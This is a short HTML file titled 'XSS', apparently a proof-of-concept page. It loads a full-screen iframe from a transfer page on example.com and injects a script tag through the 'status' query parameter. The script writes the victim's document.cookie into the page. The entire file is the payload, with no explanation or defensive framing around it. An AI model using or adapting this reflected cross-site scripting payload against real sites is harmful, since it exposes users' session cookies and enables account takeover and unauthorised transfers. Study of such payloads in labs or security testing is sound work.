<html>
<head>
    <title>XSS</title>
</head>
<body>
<iframe style="position:absolute;top:0;left:0;width: 100%; height: 100%;"
        src="https://www.example.com/newtransfer.php?status=<script>document.write(encodeURIComponent(document.cookie))</script>">
</iframe>
</body>